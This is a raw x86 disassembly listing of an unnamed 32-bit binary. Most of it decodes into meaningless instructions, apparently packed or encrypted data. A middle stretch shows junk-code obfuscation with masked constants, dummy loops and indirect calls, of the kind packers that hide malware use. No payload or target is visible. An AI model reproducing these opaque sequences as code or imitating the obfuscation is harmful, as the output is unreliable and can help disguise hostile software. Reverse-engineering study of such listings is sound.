  40f12e:	and    BYTE PTR [ecx+0x48],bh
  40f131:	xor    edi,DWORD PTR [edi]
  40f133:	cld    
  40f134:	push   0x2d
  40f136:	xchg   DWORD PTR [ebp+0xd5f1025],edx
  40f13c:	push   esi
  40f13d:	in     eax,0x7
  40f13f:	mov    BYTE PTR [ebx+0x6c],dh
  40f142:	add    BYTE PTR [ebp-0x43],ah
  40f145:	add    DWORD PTR [esi],ecx
  40f147:	imul   edx,ebp,0x87b70da6
  40f14d:	jp     0x40f166
  40f14f:	icebp  
  40f150:	mov    esp,0x9929da42
  40f155:	and    DWORD PTR [edx-0xd],edi
  40f158:	add    eax,DWORD PTR [ebx+esi*4-0x692ed653]
  40f15f:	jge    0x40f15e
  40f161:	ret    0x25f
  40f164:	add    esp,DWORD PTR [eax]
  40f166:	ficom  WORD PTR [esi]
  40f168:	cmp    esi,ebx
  40f16a:	ret    
  40f16b:	cli    
  40f16c:	mov    bh,0xe4
  40f16e:	inc    ecx
  40f16f:	jns    0x40f1ed
  40f171:	cmp    al,0x9a
  40f173:	sbb    BYTE PTR [ecx],dl
  40f175:	les    edx,FWORD PTR ds:0x24f721e2
  40f17b:	out    dx,al
  40f17c:	jb     0x40f1d2
  40f17e:	or     DWORD PTR [ebx],edx
  40f180:	in     eax,0x5e
  40f182:	arpl   WORD PTR [ebx],ax
  40f184:	sbb    al,0x93
  40f186:	pop    eax
  40f187:	std    
  40f188:	int3   
  40f189:	or     esi,DWORD PTR [esi+0x6b231717]
  40f18f:	mov    bl,0x95
  40f191:	and    eax,0xce4e4f39
  40f196:	inc    ebp
  40f197:	aam    0x9e
  40f199:	inc    esp
  40f19a:	mov    bh,0xf0
  40f19c:	dec    eax
  40f19d:	cdq    
  40f19e:	sbb    ah,BYTE PTR [edi]
  40f1a0:	jmp    0x9863396c
  40f1a5:	fadd   QWORD PTR [edi+0x4a]
  40f1a8:	push   esi
  40f1a9:	jmp    0x9b89778
  40f1ae:	sar    DWORD PTR [ebx],0x58
  40f1b1:	aas    
  40f1b2:	or     eax,0xb63a103d
  40f1b7:	imul   edi,eax,0x38
  40f1ba:	jns    0x40f1dc
  40f1bc:	cmp    esi,0x374b1ba1
  40f1c2:	push   esp
  40f1c3:	or     BYTE PTR [eax+0xb46e2fc],0x41
  40f1ca:	rcr    DWORD PTR [eax-0x62780bae],cl
  40f1d0:	sbb    bh,BYTE PTR [edx]
  40f1d2:	dec    eax
  40f1d3:	or     al,0x29
  40f1d5:	mov    BYTE PTR [ebx+0x63],0x8d
  40f1d9:	push   ss
  40f1da:	out    dx,eax
  40f1db:	jle    0x40f176
  40f1dd:	test   DWORD PTR [ecx+0x41985f00],edi
  40f1e3:	mov    ebx,0x995a03dd
  40f1e8:	pushf  
  40f1e9:	aad    0x8a
  40f1eb:	js     0x40f173
  40f1ed:	mov    ebx,0xd2f939b2
  40f1f2:	xchg   esp,eax
  40f1f3:	das    
  40f1f4:	mov    al,ds:0xeb55dcf6
  40f1f9:	cmc    
  40f1fa:	int    0x8
  40f1fc:	test   DWORD PTR [ecx+0x16b118c],0x6bad6fcb
  40f206:	mov    dh,0x9f
  40f208:	test   BYTE PTR [eax],ch
  40f20a:	inc    eax
  40f20b:	(bad)  
  40f20c:	jle    0x40f27e
  40f20e:	push   ebp
  40f20f:	cmp    BYTE PTR [edx-0x43],bl
  40f212:	(bad)  
  40f213:	jge    0x40f260
  40f215:	jne    0x40f1f4
  40f217:	dec    dh
  40f219:	xchg   edx,eax
  40f21a:	ficomp WORD PTR [ecx+0xd81f3b8]
  40f220:	jbe    0x40f269
  40f222:	sahf   
  40f223:	sub    BYTE PTR [ecx+0x6facca80],bl
  40f229:	(bad)  
  40f22a:	enter  0xa61,0xac
  40f22e:	fisttp DWORD PTR [ecx]
  40f230:	or     DWORD PTR [ecx+0x34],edx
  40f233:	loop   0x40f216
  40f235:	mov    al,ds:0x3a2b4e3c
  40f23a:	xor    al,0xb4
  40f23c:	xchg   ecx,eax
  40f23d:	push   edx
  40f23e:	out    dx,al
  40f23f:	ja     0x40f28d
  40f241:	fst    DWORD PTR [edi-0x7f]
  40f244:	adc    eax,0x4285d7
  40f249:	scas   al,BYTE PTR es:[edi]
  40f24a:	jp     0x40f24c
  40f24c:	add    BYTE PTR [ebx-0x31fcef83],cl
  40f252:	mov    DWORD PTR ds:0x4285ff,0x246a
  40f25c:	cmp    ecx,edi
  40f25e:	mov    DWORD PTR ds:0x428627,0x3e93
  40f268:	je     0x40f379
  40f26e:	xor    edi,edi
  40f270:	mov    ecx,DWORD PTR [ebp-0x4]
  40f273:	not    edi
  40f275:	mov    edi,DWORD PTR [ebp+0x10]
  40f278:	sub    DWORD PTR ds:0x42863f,0x4adb
  40f282:	xor    eax,eax
  40f284:	adc    DWORD PTR ds:0x42865f,0x6085
  40f28e:	xor    ecx,edx
  40f290:	xor    DWORD PTR ds:0x42860b,0x42862f
  40f29a:	add    ecx,esi
  40f29c:	xor    DWORD PTR ds:0x4285d7,0x24ca
  40f2a6:	add    edi,0xfabdbedd
  40f2ac:	not    DWORD PTR ds:0x428617
  40f2b2:	adc    eax,0xffffffff
  40f2b5:	xor    eax,0x0
  40f2b8:	and    DWORD PTR ds:0x428663,0x428617
  40f2c2:	mov    DWORD PTR [ebp-0xc],eax
  40f2c5:	or     DWORD PTR ds:0x42866f,0x42864f
  40f2cf:	push   ebx
  40f2d0:	add    DWORD PTR ds:0x428647,ecx
  40f2d6:	xor    ebx,ebx
  40f2d8:	xor    edi,0x8a29a137
  40f2de:	mov    eax,ecx
  40f2e0:	add    eax,0xfabdbedd
  40f2e5:	adc    ebx,0xffffffff
  40f2e8:	xor    eax,0x8a29a137
  40f2ed:	xor    ebx,0x0
  40f2f0:	cmp    eax,edi
  40f2f2:	jne    0x40f30b
  40f2f8:	cmp    ebx,DWORD PTR [ebp-0xc]
  40f2fb:	je     0x40f373
  40f301:	jmp    0x40f30b
  40f306:	mov    esi,0x3272ec
  40f30b:	mov    eax,DWORD PTR [ebp-0x4]
  40f30e:	mov    edi,DWORD PTR [ebp-0x8]
  40f311:	xor    edi,edx
  40f313:	add    edi,esi
  40f315:	mov    esi,DWORD PTR [ebp+0x8]
  40f318:	imul   edi,ecx
  40f31b:	mov    ebx,DWORD PTR [ebp+0xc]
  40f31e:	xor    eax,edx
  40f320:	add    eax,ecx
  40f322:	mov    al,BYTE PTR [ebx+eax*1+0x3272ec]
  40f329:	mov    BYTE PTR [edi+esi*1],al
  40f32c:	mov    eax,DWORD PTR [ebp-0x8]
  40f32f:	mov    esi,DWORD PTR [ebp+0x10]
  40f332:	xor    eax,edx
  40f334:	xor    ebx,ebx
  40f336:	add    esi,0xfabdbedd
  40f33c:	adc    ebx,0xffffffff
  40f33f:	lea    ecx,[ecx+eax*1+0x3272ec]
  40f346:	xor    edi,edi
  40f348:	xor    esi,0x8a29a137
  40f34e:	xor    ebx,0x0
  40f351:	mov    eax,ecx
  40f353:	add    eax,0xfabdbedd
  40f358:	adc    edi,0xffffffff
  40f35b:	xor    eax,0x8a29a137
  40f360:	xor    edi,0x0
  40f363:	cmp    eax,esi
  40f365:	jne    0x40f306
  40f36b:	cmp    edi,ebx
  40f36d:	jne    0x40f306
  40f373:	mov    eax,0xf89c85b1
  40f378:	pop    ebx
  40f379:	pop    edi
  40f37a:	pop    esi
  40f37b:	leave  
  40f37c:	ret    0xc
  40f37f:	push   ebp
  40f380:	mov    ebp,esp
  40f382:	push   ecx
  40f383:	xor    DWORD PTR ds:0x428677,0x1e97
  40f38d:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  40f394:	dec    edx
  40f395:	mov    eax,DWORD PTR [ebp-0x4]
  40f398:	or     DWORD PTR ds:0x42862f,0x2902
  40f3a2:	mov    edx,DWORD PTR [ebp+0x10]
  40f3a5:	mov    ecx,0x75108a4
  40f3aa:	adc    DWORD PTR ds:0x428677,0x428657
  40f3b4:	xor    eax,ecx
  40f3b6:	add    eax,0x3272ec
  40f3bb:	or     DWORD PTR ds:0x42866b,0x4f38
  40f3c5:	mov    DWORD PTR [edx],eax
  40f3c7:	and    DWORD PTR ds:0x428603,0x0
  40f3d1:	jmp    0x40f3e1
  40f3d6:	mov    eax,ds:0x428603
  40f3db:	inc    eax
  40f3dc:	mov    ds:0x428603,eax
  40f3e1:	cmp    DWORD PTR ds:0x428603,0x17
  40f3e8:	jae    0x40f42d
  40f3ee:	cmp    DWORD PTR ds:0x428603,0x5
  40f3f5:	jge    0x40f42d
  40f3fb:	jmp    0x40f410
  40f400:	push   0x8c16
  40f405:	push   0x428617
  40f40a:	call   DWORD PTR ds:0x4287b3
  40f410:	cmp    DWORD PTR ds:0x428603,0x4
  40f417:	jne    0x40f428
  40f41d:	mov    eax,ds:0x428603
  40f422:	inc    eax
  40f423:	mov    ds:0x428603,eax
  40f428:	jmp    0x40f3d6
  40f42d:	mov    eax,DWORD PTR [ebp+0xc]
  40f430:	xor    eax,ecx
  40f432:	push   esi
  40f433:	mov    esi,DWORD PTR [ebp+0x10]
  40f436:	mov    edx,0x3272ec
  40f43b:	add    eax,edx
  40f43d:	mov    DWORD PTR [esi+0x4],eax
  40f440:	mov    eax,DWORD PTR [ebp+0x14]
  40f443:	mov    esi,DWORD PTR [ebp+0x10]
  40f446:	mov    DWORD PTR [esi+0x8],eax
  40f449:	mov    eax,DWORD PTR [ebp+0x18]
  40f44c:	mov    esi,DWORD PTR [ebp+0x10]
  40f44f:	mov    DWORD PTR [esi+0xc],eax
  40f452:	mov    eax,DWORD PTR [ebp+0x1c]
  40f455:	mov    esi,DWORD PTR [ebp+0x10]
  40f458:	mov    DWORD PTR [esi+0x10],eax
  40f45b:	mov    eax,DWORD PTR [ebp+0x8]
  40f45e:	xor    eax,ecx
  40f460:	add    eax,edx
  40f462:	pop    esi
  40f463:	leave  
  40f464:	ret    0x18
  40f467:	push   ebp
  40f468:	mov    ebp,esp
  40f46a:	sub    esp,0x9c
  40f470:	dec    ecx
  40f471:	mov    ecx,DWORD PTR [ebp+0x8]
  40f474:	mov    eax,0x8a94
  40f479:	sbb    DWORD PTR ds:0x428677,0x4285eb
  40f483:	xor    ax,WORD PTR [ecx+0x20]
  40f487:	mov    ecx,DWORD PTR ds:0x42864b
  40f48d:	sub    ecx,DWORD PTR ds:0x428673
  40f493:	mov    DWORD PTR ds:0x42864b,ecx
  40f499:	mov    ecx,0x3b56
  40f49e:	add    ax,cx
  40f4a1:	movzx  eax,ax
  40f4a4:	and    DWORD PTR ds:0x42865f,0x0
  40f4ae:	jmp    0x40f4c0
  40f4b3:	mov    ecx,DWORD PTR ds:0x42865f
  40f4b9:	inc    ecx
  40f4ba:	mov    DWORD PTR ds:0x42865f,ecx
  40f4c0:	cmp    DWORD PTR ds:0x42865f,0x11
  40f4c7:	jae    0x40f4ea
  40f4cd:	cmp    DWORD PTR ds:0x42865f,0x17
  40f4d4:	jge    0x40f4ea
  40f4da:	jmp    0x40f4e5
  40f4df:	call   DWORD PTR ds:0x4287b7
  40f4e5:	jmp    0x40f4b3
  40f4ea:	mov    DWORD PTR [ebp-0x10],eax
  40f4ed:	mov    BYTE PTR [ebp-0x1],0x7d
  40f4f1:	and    DWORD PTR ds:0x42863b,0x0
  40f4fb:	jmp    0x40f50d
  40f500:	mov    ecx,DWORD PTR ds:0x42863b
  40f506:	inc    ecx
  40f507:	mov    DWORD PTR ds:0x42863b,ecx
  40f50d:	cmp    DWORD PTR ds:0x42863b,0x11
  40f514:	jae    0x40f53a
  40f51a:	cmp    DWORD PTR ds:0x42863b,0x14
  40f521:	jg     0x40f53a
  40f527:	jmp    0x40f535
  40f52c:	push   DWORD PTR [ebp-0x1c]
  40f52f:	call   DWORD PTR ds:0x4287bb
  40f535:	jmp    0x40f500
  40f53a:	lea    eax,[ebp-0x1]
  40f53d:	xor    DWORD PTR ds:0x4285d7,0x262c
  40f547:	mov    DWORD PTR [ebp-0xc],eax
  40f54a:	inc    ecx
  40f54b:	mov    al,BYTE PTR [ebp-0x1]
  40f54e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f551:	xor    al,0x79
  40f553:	sub    al,0x3
  40f555:	mov    BYTE PTR [ecx],al
  40f557:	mov    DWORD PTR [ebp-0x18],0xf89c85b0
  40f55e:	mov    eax,ds:0x428697
  40f563:	mov    ecx,DWORD PTR ds:0x4286db
  40f569:	sub    ecx,eax
  40f56b:	add    eax,DWORD PTR [eax+ecx*1]
  40f56e:	push   ebx
  40f56f:	and    DWORD PTR ds:0x428603,0x0
  40f579:	jmp    0x40f58c
  40f57e:	xor    eax,eax
  40f580:	add    eax,DWORD PTR ds:0x428603
  40f586:	inc    eax
  40f587:	mov    ds:0x428603,eax
  40f58c:	cmp    DWORD PTR ds:0x428603,0x10
  40f593:	jae    0x40f5e9
  40f599:	cmp    DWORD PTR ds:0x428603,0x7
  40f5a0:	jle    0x40f5e9
  40f5a6:	jmp    0x40f5c9
  40f5ab:	push   DWORD PTR [ebp-0x28]
  40f5ae:	push   0x428034
  40f5b3:	push   DWORD PTR [ebp-0x18]
  40f5b6:	push   0x428079
  40f5bb:	push   0x5a9e
  40f5c0:	push   DWORD PTR [ebp-0x14]
  40f5c3:	call   DWORD PTR ds:0x4287bf
  40f5c9:	cmp    DWORD PTR ds:0x428603,0x6
  40f5d0:	jne    0x40f5e4
  40f5d6:	xor    eax,eax
  40f5d8:	xor    eax,DWORD PTR ds:0x428603
  40f5de:	inc    eax
  40f5df:	mov    ds:0x428603,eax
  40f5e4:	jmp    0x40f57e
  40f5e9:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40f5f0:	sbb    DWORD PTR ds:0x42861b,ecx
  40f5f6:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5f9:	push   esi
  40f5fa:	mov    eax,0x75108a4
  40f5ff:	xor    esi,esi
  40f601:	or     esi,DWORD PTR ds:0x42869f
  40f607:	mov    esi,DWORD PTR [esi]
  40f609:	or     DWORD PTR ds:0x428633,esi
  40f60f:	xor    ecx,eax
  40f611:	xor    DWORD PTR ds:0x428613,ebx
  40f617:	mov    esi,0x3272ec
  40f61c:	push   edi
  40f61d:	or     DWORD PTR ds:0x4285ef,0x42867b
  40f627:	add    ecx,esi
  40f629:	mov    DWORD PTR ds:0x42867b,0x3def
  40f633:	jmp    0x40f64d
  40f638:	mov    DWORD PTR ds:0x428633,0x70a7
  40f642:	mov    dl,BYTE PTR [ebp-0x1]
  40f645:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f64c:	inc    ecx
  40f64d:	mov    DWORD PTR ds:0x4285ef,0x74bd
  40f657:	cmp    ecx,0x40
  40f65a:	mov    DWORD PTR ds:0x42865f,0x4046
  40f664:	jb     0x40f638
  40f66a:	adc    edx,0xe49
  40f670:	mov    edx,DWORD PTR [ebp-0x18]
  40f673:	xor    edx,eax
  40f675:	sub    DWORD PTR ds:0x4285d3,0x203c
  40f67f:	add    edx,esi
  40f681:	jmp    0x411adf
  40f686:	mov    edi,DWORD PTR [ebp+0x8]
  40f689:	jmp    0x411a2a
  40f68e:	sub    ah,al
  40f690:	xor    al,0xf6
  40f692:	test   al,0xa6
  40f694:	mov    al,ds:0x7e506298
  40f699:	mov    eax,DWORD PTR [ebx-0xe]
  40f69c:	mov    ebp,DWORD PTR [esi+0x42]
  40f69f:	mov    eax,ds:0x5ffe7a7a
  40f6a4:	jp     0x40f720
  40f6a6:	jne    0x40f6b6
  40f6a8:	in     eax,0x4c
  40f6aa:	sbb    al,BYTE PTR [edi+0x59]
  40f6ad:	add    dh,BYTE PTR [ebx-0xa21af58]
  40f6b3:	out    dx,al
  40f6b4:	push   es
  40f6b5:	push   esp
  40f6b6:	fs and bl,0xc1
  40f6ba:	les    edx,FWORD PTR [eax]
  40f6bc:	xchg   ebp,eax
  40f6bd:	iret   
  40f6be:	add    cl,dl
  40f6c0:	xchg   esi,eax
  40f6c1:	mov    eax,0x41f7ac6e
  40f6c6:	or     DWORD PTR [edx+0x3a0913d8],edi
  40f6cc:	arpl   WORD PTR [ebp+esi*2+0x18fbea2f],ax
  40f6d3:	jecxz  0x40f6b3
  40f6d5:	mov    eax,ds:0xdce41634
  40f6da:	xor    eax,0xe64e2421
  40f6df:	jl     0x40f6b6
  40f6e1:	sbb    al,0x77
  40f6e3:	and    ebp,DWORD PTR [ebp+0x51]
  40f6e6:	jne    0x40f743
  40f6e8:	fisubr WORD PTR [ebp+0x7]
  40f6eb:	lahf   
  40f6ec:	mov    eax,0x899295b5
  40f6f1:	sar    DWORD PTR [esi+esi*4+0x7c],cl
  40f6f5:	inc    eax
  40f6f6:	repz mov ch,0xf2
  40f6f9:	mov    WORD PTR [esp+eax*1-0x4e2804ff],?
  40f700:	arpl   WORD PTR [edx+0x36696dcf],di
  40f706:	test   DWORD PTR [ebx+0x5d],eax
  40f709:	ds pop ebx
  40f70b:	jae    0x40f725
  40f70d:	sbb    ch,BYTE PTR [eax-0x62bf678b]
  40f713:	sbb    ch,dh
  40f715:	rcr    BYTE PTR [ebx],cl
  40f717:	shl    BYTE PTR [ecx+eiz*1+0x29],1
  40f71b:	repz in eax,dx
  40f71d:	fidiv  WORD PTR [esi]
  40f71f:	imul   edx,DWORD PTR [esi-0x5e82f3eb],0xa9550f32
  40f729:	rcr    DWORD PTR ds:0xb13c4680,0x5f
  40f730:	adc    DWORD PTR [edi+0x43],ebp
  40f733:	fimul  WORD PTR [edx]
  40f735:	pop    ds
  40f736:	mov    eax,0x387057fd
  40f73b:	sub    eax,0xfbf45885
  40f740:	dec    ebp
  40f741:	jge    0x40f799
  40f743:	add    DWORD PTR [esi-0x2a],eax
  40f746:	dec    esp
  40f747:	and    al,BYTE PTR [ebx]
  40f749:	dec    eax
  40f74a:	sub    eax,0x8f494dd3
  40f74f:	in     al,dx
  40f750:	mov    eax,ds:0x66416d18
  40f755:	rcl    DWORD PTR [ebp+0x14],1
  40f758:	jl     0x40f771
  40f75a:	add    al,dl
  40f75c:	iret   
  40f75d:	push   ecx
  40f75e:	cmc    
  40f75f:	xor    BYTE PTR [edx+0x3d023dba],cl
  40f765:	mov    ebp,0x148e295f
  40f76a:	mov    ds:0xafaf5e04,al
  40f76f:	push   ebp
  40f770:	or     al,0xdb
  40f772:	in     eax,0xcb
  40f774:	pop    ebp
  40f775:	mov    ecx,0x62b2b2fa
  40f77a:	sbb    ebp,eax
  40f77c:	sbb    eax,0xaf750046
  40f781:	clc    
  40f782:	mov    WORD PTR [ecx-0x16],ss
  40f785:	imul   ebp,DWORD PTR [edx+0x22db45e],0x3144636e
  40f78f:	inc    eax
  40f790:	push   edx
  40f791:	bound  edx,QWORD PTR [ebx-0x6099dd75]
  40f797:	mov    ecx,0xed212af2
  40f79c:	sbb    al,0x5b
  40f79e:	sbb    dh,dl
  40f7a0:	ret    0x5725
  40f7a3:	xchg   ebx,eax
  40f7a4:	or     eax,0x613a343
  40f7a9:	mov    ebp,DWORD PTR [ebx-0x11]
  40f7ac:	ficomp WORD PTR [ebx]
  40f7ae:	sti    
  40f7af:	adc    BYTE PTR [ebp-0x31007435],bh
  40f7b5:	pop    esp
  40f7b6:	xchg   esi,eax
  40f7b7:	add    BYTE PTR [edi-0x40],0xb7
  40f7bb:	add    ah,0xb
  40f7be:	mov    ds:0xdf11cd05,eax
  40f7c3:	sub    BYTE PTR [edx-0x14],bh
  40f7c6:	pop    edx
  40f7c7:	call   0x1ed6:0xf120a9d2
  40f7ce:	(bad)  
  40f7d0:	mov    ebp,0x5e0cf3dd
  40f7d5:	mov    ebp,edx
  40f7d7:	pushf  
  40f7d8:	cmp    edx,DWORD PTR ds:0x963e8312
  40f7de:	xor    DWORD PTR [ebx-0x1389bc6e],edi
  40f7e4:	push   es
  40f7e5:	sti    
  40f7e6:	lods   al,BYTE PTR ds:[esi]
  40f7e7:	inc    edx
  40f7e8:	in     eax,0x7f
  40f7ea:	push   ds
  40f7eb:	stos   BYTE PTR es:[edi],al
  40f7ec:	cli    
  40f7ed:	retf   0x7472
  40f7f0:	cld    
  40f7f1:	sbb    al,0xc8
  40f7f3:	mov    es,WORD PTR [eax]
  40f7f5:	pop    esp
  40f7f6:	call   FWORD PTR [edi-0x2553d873]
  40f7fc:	inc    edi
  40f7fd:	cmp    al,0x6d
  40f7ff:	imul   edx,DWORD PTR [edi-0x64b28108],0xffffffe4
  40f806:	fdivr  QWORD PTR [edx+0x3c]
  40f809:	push   eax
  40f80a:	sub    eax,0xafa8e0cf
  40f80f:	push   esi
  40f810:	mov    ebx,ebp
  40f812:	push   0x4af779fa
  40f817:	add    al,ah
  40f819:	outs   dx,DWORD PTR ds:[esi]
  40f81a:	lods   eax,DWORD PTR ds:[esi]
  40f81b:	aad    0x24
  40f81d:	test   al,0xa5
  40f81f:	jbe    0x40f875
  40f821:	adc    eax,ecx
  40f823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f824:	mov    edx,0xdf72d0e
  40f829:	ds sbb eax,0x1777049b
  40f82f:	dec    ebx
  40f830:	push   ebx
  40f831:	neg    BYTE PTR [edx]
  40f833:	ss pop es
  40f835:	pop    ebp
  40f836:	(bad)  
  40f837:	test   DWORD PTR [ebx+0x11],0xe0cea876
  40f83e:	inc    ecx
  40f83f:	das    
  40f840:	call   0x7a095138
  40f845:	repnz mov esp,0xa3bb5322
  40f84b:	push   es
  40f84c:	out    0xa6,al
  40f84e:	ja     0x40f818
  40f850:	loope  0x40f889
  40f852:	push   es
  40f853:	lea    edi,[ebx-0x64]
  40f856:	pop    ecx
  40f857:	sahf   
  40f858:	mov    eax,ds:0x81cc1422
  40f85d:	out    0xc3,eax
  40f85f:	and    al,0xc7
  40f861:	stos   BYTE PTR es:[edi],al
  40f862:	popa   
  40f863:	mov    ebp,0xfd11029
  40f868:	(bad)  
  40f869:	std    
  40f86a:	xchg   edi,eax
  40f86b:	push   eax
  40f86c:	push   eax
  40f86d:	mov    ds:0x2181fa6b,eax
  40f872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f873:	inc    ecx
  40f874:	or     ebp,0x3b5d178b
  40f87a:	jmp    0x60dce18c
  40f87f:	ja     0x40f88a
  40f881:	dec    eax
  40f882:	xor    ebp,DWORD PTR [ebx]
  40f884:	mov    ss,WORD PTR [edx-0x2c5d2a2f]
  40f88a:	lods   al,BYTE PTR ds:[esi]
  40f88b:	int    0x85
  40f88d:	scas   al,BYTE PTR es:[edi]
  40f88e:	call   0xcc6cb0c1
  40f893:	sub    DWORD PTR [edi+0x6bc877b0],ebp
  40f899:	pop    ss
  40f89a:	xor    DWORD PTR [edx-0x3592865b],ecx
  40f8a0:	stos   DWORD PTR es:[edi],eax
  40f8a1:	rcl    DWORD PTR [esi+0x61172491],0x71
  40f8a8:	les    edi,FWORD PTR [ecx+0x7]
  40f8ab:	mov    eax,0x7364f42a
  40f8b0:	dec    esi
  40f8b1:	jbe    0x40f84a
  40f8b3:	inc    edx
  40f8b4:	rcr    DWORD PTR ds:[eax],cl
  40f8b7:	sbb    dl,dl
  40f8b9:	push   cs
  40f8ba:	dec    eax
  40f8bb:	(bad)  
  40f8bd:	out    0x88,eax
  40f8bf:	daa    
  40f8c0:	mov    DWORD PTR [ebp+edx*8-0x5b],ebx
  40f8c4:	and    BYTE PTR [eax+0x3d],ch
  40f8c7:	out    dx,al
  40f8c8:	aad    0xa
  40f8ca:	mov    ebp,0xdae4fe84
  40f8cf:	(bad)  
  40f8d0:	xchg   edx,eax
  40f8d1:	cdq    
  40f8d2:	out    0xdc,eax
  40f8d4:	add    dh,BYTE PTR [esi-0x13]
  40f8d7:	adc    DWORD PTR [esi+0x17],0x1b
  40f8db:	js     0x40f8fb
  40f8dd:	push   edi
  40f8de:	adc    eax,0xac541d88
  40f8e3:	xchg   edx,esi
  40f8e5:	and    eax,0x4cedb19
  40f8ea:	test   eax,0xcaab49f2
  40f8ef:	lds    ebp,FWORD PTR [esi+0x1]
  40f8f2:	xchg   ebp,eax
  40f8f3:	aam    0x4
  40f8f5:	add    esi,DWORD PTR [esi]
  40f8f7:	pop    eax
  40f8f8:	push   es
  40f8f9:	jns    0x40f89b
  40f8fb:	icebp  
  40f8fc:	(bad)  
  40f8fd:	sbb    eax,DWORD PTR [edx-0x446ac25a]
  40f903:	sysret 
  40f905:	ja     0x40f973
  40f907:	lods   eax,DWORD PTR ds:[esi]
  40f908:	jecxz  0x40f967
  40f90a:	mov    WORD PTR [ebp+0x238cd117],fs
  40f910:	dec    ebx
  40f911:	mov    ecx,0x1549c75e
  40f916:	add    DWORD PTR [ebp+0x71],ecx
  40f919:	in     eax,0x3e
  40f91b:	retf   
  40f91c:	cdq    
  40f91d:	pop    edi
  40f91e:	jbe    0x40f8c3
  40f920:	ficomp DWORD PTR [ebx+ebx*1]
  40f923:	mov    dh,0x52
  40f925:	mov    eax,ds:0x692d9248
  40f92a:	xor    BYTE PTR [ebx],0xe5
  40f92d:	jmp    0x40f928
  40f92f:	dec    esi
  40f930:	push   esi
  40f931:	stos   DWORD PTR es:[edi],eax
  40f932:	add    BYTE PTR [ebx-0x24],0xbd
  40f936:	bound  edx,QWORD PTR [edi+edx*4-0x5f159787]
  40f93d:	ds dec edx
  40f93f:	data16 ficom DWORD PTR [edi-0x36]
  40f943:	aam    0x10
  40f945:	inc    edi
  40f946:	add    DWORD PTR [eax-0x384fea9],0xffffff81
  40f94d:	std    
  40f94e:	pop    ecx
  40f94f:	inc    edx
  40f950:	rcr    cl,0x9e
  40f953:	out    0x24,al
  40f955:	dec    eax
  40f956:	sbb    BYTE PTR [edx+0x30],0x1e
  40f95a:	sar    bl,0xdd
  40f95d:	or     ebx,DWORD PTR [edx-0xf76f125]
  40f963:	adc    al,dh
  40f965:	xchg   edx,eax
  40f966:	pop    ss
  40f967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f968:	mov    ch,0x2b
  40f96a:	test   al,0xe
  40f96c:	add    BYTE PTR [edx-0x7e81ff1e],al
  40f972:	mov    bl,0xfd
  40f974:	jl     0x40f990
  40f976:	fwait
  40f977:	lods   al,BYTE PTR ds:[esi]
  40f978:	inc    ecx
  40f979:	xor    al,0x40
  40f97b:	pop    eax
  40f97c:	adc    BYTE PTR [edi-0x7b],al
  40f97f:	std    
  40f980:	push   cs
  40f981:	mov    edx,0x2c01a9f1
  40f986:	mov    esp,0xd38f61d4
  40f98b:	push   cs
  40f98c:	sub    esi,DWORD PTR [ebp+esi*1+0x7e]
  40f990:	out    dx,al
  40f991:	int    0xb
  40f993:	fild   WORD PTR [edx+0x409a67cd]
  40f999:	push   ss
  40f99a:	sbb    eax,0x697659a1
  40f99f:	shl    DWORD PTR [esi-0x2d],1
  40f9a2:	cmp    al,0x1b
  40f9a4:	and    DWORD PTR [ecx],ebx
  40f9a6:	jb     0x40f9a2
  40f9a8:	sbb    DWORD PTR [ebx+0x40],esi
  40f9ab:	fdivr  st(1),st
  40f9ad:	mov    cl,0x14
  40f9af:	repz xor al,0x19
  40f9b2:	push   edx
  40f9b3:	lahf   
  40f9b4:	add    eax,0x7be5c59e
  40f9b9:	js     0x40f97a
  40f9bb:	adc    cl,BYTE PTR [esi-0x69]
  40f9be:	xchg   esp,eax
  40f9bf:	leave  
  40f9c0:	js     0x40f94e
  40f9c2:	mov    ds:0x7600d66f,eax
  40f9c7:	xchg   edx,eax
  40f9c8:	jmp    0xad0:0xb4a327a6
  40f9cf:	inc    esi
  40f9d0:	xchg   DWORD PTR [eax+0x105ee93a],ecx
  40f9d6:	push   esp
  40f9d7:	inc    edx
  40f9d8:	jmp    0x37544ec1
  40f9dd:	push   0x87a4c344
  40f9e2:	inc    eax
  40f9e3:	add    DWORD PTR [esi],ebp
  40f9e5:	rcl    BYTE PTR [edi-0x1e],cl
  40f9e8:	enter  0x6a08,0x27
  40f9ec:	(bad)  
  40f9ed:	daa    
  40f9ee:	loopne 0x40f993
  40f9f0:	in     al,0xb6
  40f9f2:	aad    0xb9
  40f9f4:	or     edi,esp
  40f9f6:	sub    eax,0x86ce81f3
  40f9fb:	(bad)  
  40f9fd:	test   eax,0xedf89726
  40fa02:	fstp   QWORD PTR [ebx-0xe]
  40fa05:	cmp    BYTE PTR [esi],ah
  40fa07:	mov    DWORD PTR [ebx],esp
  40fa09:	push   esp
  40fa0a:	nop
  40fa0b:	aaa    
  40fa0c:	xchg   ebx,eax
  40fa0d:	jae    0x40fa4e
  40fa0f:	ins    DWORD PTR es:[edi],dx
  40fa10:	push   0x8436c5b9
  40fa15:	enter  0xe64c,0x58
  40fa19:	retf   0x8791
  40fa1c:	cld    
  40fa1d:	cwde   
  40fa1e:	jmp    0xdd02:0x9db37760
  40fa25:	enter  0x71bf,0x49
  40fa29:	scas   eax,DWORD PTR es:[edi]
  40fa2a:	(bad)  
  40fa2b:	xlat   BYTE PTR ds:[ebx]
  40fa2c:	jecxz  0x40fa65
  40fa2e:	cmp    ch,BYTE PTR [edi+ebx*2-0x50d30be6]
  40fa35:	fcomi  st,st(4)
  40fa37:	outs   dx,BYTE PTR ds:[esi]
  40fa38:	(bad)  [edi]
  40fa3a:	mov    esi,0x3310e9e8
  40fa3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa40:	aas    
  40fa41:	aaa    
  40fa42:	mov    ebx,0xf5c2f174
  40fa47:	comiss xmm4,DWORD PTR [ecx+0x3c]
  40fa4b:	mov    ds:0x4f42ce3a,eax
  40fa50:	scas   al,BYTE PTR es:[edi]
  40fa51:	stc    
  40fa52:	xor    DWORD PTR [esi],ecx
  40fa54:	mov    ebx,0x73886f3e
  40fa59:	loope  0x40fa02
  40fa5b:	add    ah,BYTE PTR [edi]
  40fa5d:	shl    edi,cl
